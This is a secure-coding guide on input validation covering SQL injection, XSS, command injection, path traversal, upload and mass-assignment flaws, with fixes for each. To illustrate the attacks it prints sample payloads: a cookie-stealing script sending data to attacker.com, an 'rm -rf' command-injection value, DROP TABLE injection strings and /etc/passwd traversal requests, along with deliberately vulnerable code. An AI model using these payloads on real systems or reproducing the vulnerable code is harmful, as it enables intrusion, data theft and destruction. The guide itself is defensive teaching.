# Input Handling & Validation

> Every place a user can give your application data is a door. Your job is to decide what gets through.

---

!!! abstract "TL;DR"
    - Every input is untrusted until your code proves otherwise — including data from your own database.
    - Validation, sanitization, and encoding are three different things. All three are required.
    - SQL injection is still the most exploited vulnerability in web applications. Parameterized queries are the only fix.
    - XSS lets attackers run code in your users' browsers. Output encoding stops it.
    - File uploads are the highest-risk feature you can build. Validate everything.
    - Never pass user input directly to a shell command, a file path, or a database query without processing it first.
    - Rate limiting is input control. Add it to every endpoint that accepts user data.

    Know this already? Jump to [The Validation Checklist →](#the-validation-checklist)

---

Most developers think about input in one direction: a user types something, the application processes it, something happens. That is the happy path — the scenario where everything goes as intended.

Attackers think about input differently. They ask: what happens when I send something this application was not designed to handle? What if I send a SQL command instead of a name? What if I send a script instead of a comment? What if I send a file path that navigates outside the intended directory? What if I send ten thousand requests per second?

Every place your application accepts data from the outside world is a potential entry point for an attack. Forms, URL parameters, file uploads, API requests, cookies, HTTP headers — all of it. The application that validates nothing is the application that can be made to do anything.

This section covers the most common input-based attacks, how they work at a technical level, and exactly how to stop them.

---

## Where Input Comes From — More Places Than You Think

Most developers protect the obvious inputs — form fields, search boxes, login forms. The vulnerabilities that actually get exploited are often in the places nobody thought to validate.

```
Obvious input sources:
→ Form fields — names, emails, passwords, messages
→ Search queries
→ Login credentials

Less obvious input sources:
→ URL parameters — /user?id=123 (what if id=DROP TABLE users?)
→ URL path segments — /user/123/profile (what if 123=../admin?)
→ HTTP headers — User-Agent, Referer, X-Forwarded-For
   (all controllable by the client, all often logged or processed)
→ Cookies — readable and modifiable by users and attackers
→ File uploads — name, type, size, and contents are all input
→ API request bodies — JSON, XML, form data
→ Query strings — even ones you think are internal-only
→ Webhook payloads — data sent to you by third-party services
→ Third-party API responses — data returned to you by services
   you call (not safe just because you asked for it)
→ Environment variables — if user-configurable, they are input
→ Config files — if user-editable, they are input
→ Database reads — data you stored may have been malicious 
   when it was saved; re-validate before processing
```

!!! warning "Data from your own database is not automatically safe"
    If a user submitted malicious data and it was stored without validation, reading it back out and processing it will execute the attack. Validate data at the point of storage and again at the point of use if it will be rendered or executed.

---

## Validation vs Sanitization vs Encoding

These three terms are often used interchangeably. They are not the same thing and they protect against different threats.

**Validation** — checking whether input meets your requirements before accepting it.

```python
# Is this a valid email address?
import re
def is_valid_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))

# If validation fails — reject the input entirely
if not is_valid_email(user_email):
    return {"error": "Invalid email address"}, 400
```

**Sanitization** — removing or transforming dangerous content from input that you have decided to accept.

```python
# Remove HTML tags from a user-submitted comment
import bleach
def sanitize_comment(comment):
    # Allow only safe tags, strip everything else
    allowed_tags = ['b', 'i', 'u', 'em', 'strong']
    return bleach.clean(comment, tags=allowed_tags, strip=True)
```

**Encoding** — transforming data before outputting it so it cannot be interpreted as code.

```python
# Before displaying user content in HTML — encode it
from markupsafe import escape
safe_output = escape(user_input)
# < becomes &lt;  > becomes &gt;  " becomes &#34;
# The browser displays the characters — it does not execute them
```

The pattern: validate at input, sanitize if needed, encode at output. All three. Not one or two.

---

## The Validation Hierarchy

Apply these checks in order. Stop at the first failure and reject the input.

```
Step 1 — TYPE CHECK
Is this the right data type?
Expected a number — is it actually a number?
Expected a string — is it actually a string?

Step 2 — FORMAT CHECK
Does it match the expected pattern?
An email should match an email pattern.
A date should be a valid date.
A CVE ID should match CVE-YYYY-NNNNN exactly.

Step 3 — RANGE CHECK
Is it within acceptable bounds?
A username between 3 and 50 characters.
An age between 0 and 150.
A price greater than 0.

Step 4 — WHITELIST CHECK
Is it one of the known valid values?
A country code should be in the list of valid country codes.
A sort direction should be "asc" or "desc" — nothing else.

Step 5 — SANITIZE
Strip anything that should not be there.
Remove control characters. Trim whitespace.
Strip HTML if HTML is not expected.

Step 6 — ENCODE BEFORE OUTPUT
Before rendering user data in HTML, JSON, SQL, or a shell —
encode it for that specific context.
```

**In code:**

```python
def process_username(username):
    # Step 1 — Type check
    if not isinstance(username, str):
        raise ValueError("Username must be a string")
    
    # Step 2 — Format check
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Username can only contain letters, numbers, and underscores")
    
    # Step 3 — Range check
    if not 3 <= len(username) <= 50:
        raise ValueError("Username must be between 3 and 50 characters")
    
    # Step 4 — Whitelist (no reserved words)
    reserved = ['admin', 'root', 'system', 'null']
    if username.lower() in reserved:
        raise ValueError("That username is not available")
    
    # Step 5 — Sanitize (strip whitespace, already done by format check)
    username = username.strip()
    
    return username
```

---

## SQL Injection — The Attack That Will Not Die

SQL injection has been the most common web application vulnerability for over two decades. Despite being well-understood, well-documented, and completely preventable, it is still responsible for a significant percentage of data breaches every year. Understanding exactly how it works is the first step to never being vulnerable to it.

**How it works:**

Your application takes user input and uses it to build a database query. If you construct that query by concatenating strings — sticking user input directly into the SQL — an attacker can submit input that changes the structure of the query itself.

Think of it like ordering at a restaurant by handing the server a handwritten note. The server is trained to follow whatever the note says. If you write "make me a sandwich," they make a sandwich. But if someone sneaks in and rewrites your note to say "make me a sandwich AND comp me free dessert and free fries," the server follows those instructions too — because they just execute the note, not the intent behind it. Your database works the same way. It executes whatever SQL it receives. If an attacker can change the SQL, the database does exactly what the attacker asked.

Here is a login form example. The application expects an email and a password:

```python
# This is how a vulnerable application builds the query
email = request.form['email']
password = request.form['password']

query = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"
```

For a normal user, this produces:
```sql
SELECT * FROM users WHERE email = 'user@example.com' AND password = 'mypassword'
```

But what if an attacker enters this as the email:
```
' OR '1'='1
```

The query becomes:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1' AND password = 'anything'
```

`'1'='1'` is always true. This query now returns every user in the database. The attacker is logged in — as the first user in the table, which is often the admin account.

A more destructive example — if the attacker enters this as the email:
```
'; DROP TABLE users; --
```

The query becomes:
```sql
SELECT * FROM users WHERE email = ''; DROP TABLE users; --' AND password = 'anything'
```

Your entire users table is gone.

**What an attacker can do with SQL injection:**

```
→ Bypass authentication — log in without a password
→ Extract data — read any table in the database
→ Modify data — change prices, permissions, account details
→ Delete data — drop tables, wipe records
→ In some configurations — read files from the server filesystem
→ In some configurations — execute operating system commands
```

**The fix — parameterized queries:**

Normally your application builds the question and the user input together in one piece — and if the input contains SQL commands, the database reads them as commands. A parameterized query changes that. The question goes first. The database reads it, understands what it is supposed to do, and locks the structure in. Then the user input arrives separately — but at that point the database has already decided what it is doing. The input can only fill the blank. It cannot change the plan.

Think of it like filling out a pre-printed form. The fields are already there — name, email, date. You can write whatever you want in the name field, but you cannot add a new field or change what the form is asking. Your input fills the blank. It cannot rewrite the form.

```python
# Wrong — string concatenation — SQL injection is possible
query = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"
cursor.execute(query)

# Correct — parameterized query — SQL injection is impossible
query = "SELECT * FROM users WHERE email = ? AND password = ?"
cursor.execute(query, (email, password))

# For PostgreSQL with psycopg2
query = "SELECT * FROM users WHERE email = %s AND password = %s"
cursor.execute(query, (email, password))
```

The `?` and `%s` are placeholders — blank spaces in the query that the database fills in with your data after the query structure is already locked in. The database driver handles making the data safe to use. Because the data travels separately from the query, it is impossible for the data to change what the query does — no matter what the data contains. There is no way to accidentally leave a door open because the door does not exist.

**Do ORMs protect you?**

ORMs (Object Relational Mappers) like SQLAlchemy, Django ORM, and Sequelize use parameterized queries by default — so basic queries are safe. But ORMs can still be vulnerable if you use raw query methods with string concatenation:

```python
# Safe — ORM handles parameterization
user = User.query.filter_by(email=email).first()

# Unsafe — raw SQL with string concatenation even inside an ORM
user = db.session.execute(f"SELECT * FROM users WHERE email = '{email}'").first()
```

If you use raw SQL — parameterize it. Always.

---

## XSS — Cross-Site Scripting

Cross-site scripting (XSS) is what happens when an attacker can get your application to display their code in other users' browsers. The application becomes the delivery mechanism for an attack against its own users.

Imagine you leave a sticky note on a public bulletin board and everyone who walks past reads it. Now imagine someone replaced your note with one that says "everyone who reads this, go give your wallet to the person standing by the door." XSS is the digital version of that. An attacker replaces innocent content with instructions, and every user who views the page unknowingly follows those instructions — giving away their login session, their keystrokes, or their personal data.

**How it works:**

Your application displays content that users have submitted. If that content is not properly encoded before display, a browser will treat it as code and execute it.

A comment section is a classic example. A user submits this as a comment:

```html
<script>
  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;
</script>
```

If your application stores this and displays it without encoding, every user who views that comment has their session cookie sent to the attacker. The attacker can then use that cookie to log in as each affected user — without knowing their password.

**Three types of XSS:**

```
Stored XSS — the malicious content is saved in your database
and served to every user who views the affected page.
Most dangerous. Affects every victim automatically.

Reflected XSS — the malicious content is in the URL and
reflected back in the response. Requires tricking a user
into clicking a crafted link.
Example: https://yoursite.com/search?q=<script>...</script>

DOM-based XSS — the attack happens entirely in the browser
through JavaScript that reads from the URL or other
client-side sources without going through the server.
Harder to detect with server-side scanning.
```

**What an attacker can do with XSS:**

```
→ Steal session cookies — log in as any affected user
→ Capture keystrokes — record everything typed on the page
→ Redirect users — send them to phishing pages
→ Modify page content — deface the site or add fake login forms
→ Mine cryptocurrency — use victims' browsers as compute power
→ Spread the attack — make infected pages infect other pages
```

**The fix — output encoding:**

Before displaying any user-submitted content in HTML, encode it so the browser treats it as text, not as code.

```python
# Flask — use Jinja2's auto-escaping (enabled by default in .html templates)
# In templates, {{ user_input }} is automatically escaped
# Use {{ user_input | safe }} ONLY when you are certain the content is safe

# Python — manual encoding with markupsafe
from markupsafe import escape
safe_content = escape(user_comment)
# <script> becomes &lt;script&gt; — displayed as text, not executed

# If you need to allow some HTML — use bleach to allowlist safe tags
import bleach
allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'p']
safe_content = bleach.clean(user_comment, tags=allowed_tags, strip=True)
```

**Content Security Policy (CSP):**

CSP is an HTTP header that tells browsers which sources of scripts, styles, and other resources are trusted. Even if an attacker injects a script, CSP can prevent the browser from executing it.

```python
# Flask — add CSP header to responses
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:;"
    )
    return response
```

CSP is a defense-in-depth measure — it does not replace output encoding, but it significantly limits what an attacker can do if encoding fails.

---

## Command Injection

A shell command is an instruction sent directly to your operating system — the same kind of command you type in your terminal. Commands like `ls`, `cat`, `rm`, `mkdir` are shell commands. Your application sometimes needs to run these to do things like read a file, call a system tool, or process data.

The danger: if your application takes user input and includes it in a shell command, the user controls part of what the operating system executes. Most operating systems let you chain commands together using characters like `;`, `&&`, or `|`. An attacker who knows this can submit input that adds their own command to the one your application intended to run.

Command injection occurs when user input reaches a shell command without proper handling. The application intends to run one command — the attacker adds their own.

```python
# Vulnerable — user input goes directly to the shell
import subprocess
filename = request.args.get('file')
result = subprocess.run(f"cat /uploads/{filename}", shell=True, capture_output=True)

# If filename is: report.txt; rm -rf /uploads/
# The shell executes: cat /uploads/report.txt; rm -rf /uploads/
# Your uploads directory is now gone.
```

**The fix — never use shell=True with user input:**

```python
# Correct — use a list of arguments, not a shell string
import subprocess
import os

filename = request.args.get('file', '')

# Validate the filename first
if not re.match(r'^[a-zA-Z0-9_\-\.]+$', filename):
    return "Invalid filename", 400

filepath = os.path.join('/uploads', filename)

# Resolve the real path and confirm it is inside /uploads
real_path = os.path.realpath(filepath)
if not real_path.startswith('/uploads/'):
    return "Access denied", 403

result = subprocess.run(['cat', real_path], capture_output=True, shell=False)
```

When `shell=False`, the argument list is passed directly to the OS — no shell interpretation, no injection possible.

---

## Path Traversal

Path traversal attacks use `../` sequences to navigate outside the intended directory. An application that lets users request files by name without validating the path can be made to serve files from anywhere on the filesystem.

```
GET /download?file=report.pdf
→ Serves /uploads/report.pdf  (intended)

GET /download?file=../../../etc/passwd
→ Serves /etc/passwd  (your system's user list)

GET /download?file=../../../app/config.py
→ Serves your application's config file with credentials
```

**The fix — resolve and validate the real path:**

```python
import os

def safe_file_download(filename):
    # Define the allowed directory
    upload_dir = '/uploads'
    
    # Construct the intended path
    requested_path = os.path.join(upload_dir, filename)
    
    # Resolve symlinks and normalize the path
    real_path = os.path.realpath(requested_path)
    
    # Verify it is still inside the allowed directory
    if not real_path.startswith(os.path.realpath(upload_dir) + os.sep):
        raise PermissionError("Access denied")
    
    # Verify the file actually exists
    if not os.path.isfile(real_path):
        raise FileNotFoundError("File not found")
    
    return real_path
```

---

## File Upload Security

File uploads are one of the highest-risk features you can add to an application. The surface area is large: the filename, the file type, the file size, and the file contents are all user-controlled input. Each one is an attack vector.

**What attackers upload:**

```
→ Malicious scripts disguised as images
  A file named profile.jpg that is actually a PHP shell
  
→ Oversized files to exhaust storage or memory (DoS)

→ Files with path traversal in the filename
  ../../config/settings.py as the "filename"

→ Files with null bytes in the name
  image.jpg\x00.php — some systems truncate at the null byte
  
→ Archive bombs — compressed files that expand to enormous size
  A 1KB zip that expands to 10GB
```

**Validate everything:**

```python
import magic  # python-magic library
import os

ALLOWED_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
MAX_SIZE_BYTES = 5 * 1024 * 1024  # 5MB

def validate_upload(file):
    # Check file size
    file.seek(0, 2)  # Seek to end
    size = file.tell()
    file.seek(0)  # Reset
    
    if size > MAX_SIZE_BYTES:
        raise ValueError(f"File too large. Maximum size is 5MB.")
    
    # Check actual file type by reading the magic bytes
    # Do NOT trust the file extension or the Content-Type header
    file_type = magic.from_buffer(file.read(2048), mime=True)
    file.seek(0)
    
    if file_type not in ALLOWED_TYPES:
        raise ValueError(f"File type not allowed: {file_type}")
    
    # Sanitize the filename
    filename = secure_filename(file.filename)  # werkzeug's secure_filename
    if not filename:
        raise ValueError("Invalid filename")
    
    return filename, file_type
```

**Where to store uploaded files:**

```
→ Never in your web root — files stored where they can be 
  directly accessed via URL can be executed by the server
  
→ Store outside the web root and serve through your application
  with proper content-type headers
  
→ Better: store in cloud storage (S3, GCS) with no public access
  and serve via pre-signed URLs with short expiration
  
→ Scan uploads with antivirus before making them available
```

---

## Mass Assignment

Mass assignment happens when your application automatically assigns request data to model properties without specifying which properties are allowed. An attacker can send extra fields that were never meant to be user-settable.

```python
# Vulnerable — assigns all request data to the user model
@app.route('/api/user/update', methods=['POST'])
def update_user():
    data = request.json
    user = User.query.get(current_user.id)
    for key, value in data.items():
        setattr(user, key, value)  # Sets ANY attribute from request
    db.session.commit()
    return jsonify(user.to_dict())

# Attacker sends: {"name": "Alice", "is_admin": true, "balance": 1000000}
# All three fields get set. Alice is now an admin with a million dollar balance.
```

**The fix — explicit allowlist:**

```python
# Correct — only allow specific fields to be updated
ALLOWED_USER_FIELDS = {'name', 'email', 'bio', 'location'}

@app.route('/api/user/update', methods=['POST'])
def update_user():
    data = request.json
    user = User.query.get(current_user.id)
    
    for key, value in data.items():
        if key in ALLOWED_USER_FIELDS:  # Only set allowed fields
            setattr(user, key, value)
    
    db.session.commit()
    return jsonify(user.to_dict())
```

---

## API Input Validation

APIs accept structured data — JSON bodies, query parameters, path parameters, headers. All of it is user input. All of it needs validation.

**Schema validation with Pydantic (Python):**

Pydantic lets you define exactly what a valid request looks like. If the request does not match the schema, it is rejected automatically before your business logic ever runs.

```python
from pydantic import BaseModel, EmailStr, validator
from typing import Optional

class CreateUserRequest(BaseModel):
    email: EmailStr  # Validates email format automatically
    username: str
    age: Optional[int] = None
    
    @validator('username')
    def username_valid(cls, v):
        if not re.match(r'^[a-zA-Z0-9_]{3,50}$', v):
            raise ValueError('Invalid username format')
        return v
    
    @validator('age')
    def age_valid(cls, v):
        if v is not None and not (0 <= v <= 150):
            raise ValueError('Age must be between 0 and 150')
        return v

@app.route('/api/users', methods=['POST'])
def create_user():
    try:
        data = CreateUserRequest(**request.json)
    except ValidationError as e:
        return jsonify({'errors': e.errors()}), 400
    
    # data is now validated and typed
    create_new_user(data.email, data.username, data.age)
```

**Validating third-party API responses:**

Data returned by APIs you call is not automatically safe. It has been through their system and could be malformed, manipulated, or missing expected fields.

```python
# Vulnerable — trusts API response without validation
response = requests.get('https://api.example.com/data', timeout=10)
data = response.json()
user_email = data['user']['email']  # KeyError if structure differs
process_email(user_email)  # Could be None, malformed, or malicious

# Correct — validate before using
response = requests.get('https://api.example.com/data', timeout=10)
response.raise_for_status()

data = response.json()

# Validate structure exists
if not isinstance(data, dict) or 'user' not in data:
    raise ValueError("Unexpected API response structure")

user = data['user']
if not isinstance(user, dict) or 'email' not in user:
    raise ValueError("Missing email in API response")

email = user['email']
if not isinstance(email, str) or not is_valid_email(email):
    raise ValueError(f"Invalid email in API response: {email}")

process_email(email)
```

**Rate limiting as input control:**

Rate limiting is not just about preventing server overload — it is input control. It limits how many times an attacker can attempt to brute force a login, enumerate valid usernames, or probe your API for vulnerabilities.

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

# Login — strict limit to prevent brute force
@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    pass

# Search — moderate limit
@app.route('/api/search')
@limiter.limit("30 per minute")
def search():
    pass

# Public read endpoints — generous but still limited
@app.route('/api/posts')
@limiter.limit("100 per minute")
def get_posts():
    pass
```

---

## The Validation Checklist

Run through this for every endpoint before you ship it.

```
INPUT SOURCES
□ Form fields validated — type, format, range, length
□ URL parameters validated — not used raw in queries or paths
□ URL path segments validated — no traversal possible
□ HTTP headers that are processed — validated and sanitized
□ Cookies that are read — validated before use
□ File uploads — type, size, filename, contents all validated
□ Request body schema validated — pydantic, marshmallow, or equivalent
□ Third-party API responses validated before use
□ Database reads re-validated if used in security decisions

DATABASE
□ All queries use parameterized statements — no string concatenation
□ ORM raw queries checked for injection
□ Stored data sanitized at write time

OUTPUT
□ User content encoded before rendering in HTML
□ Content-Security-Policy header set
□ JSON responses do not leak internal field names or stack traces

FILE OPERATIONS
□ File paths resolved and confirmed within allowed directory
□ No shell=True with user-controlled input
□ File uploads stored outside web root

RATE LIMITING
□ Authentication endpoints rate limited
□ Search and enumeration endpoints rate limited
□ Any endpoint that accepts user input has a limit

ERRORS
□ Error messages help users fix problems without revealing
  system internals, stack traces, or database structure
□ All exceptions caught and handled gracefully
```

---

*[@sudochef](https://instagram.com/sudochef) — Build like you're the target. Because you are.*
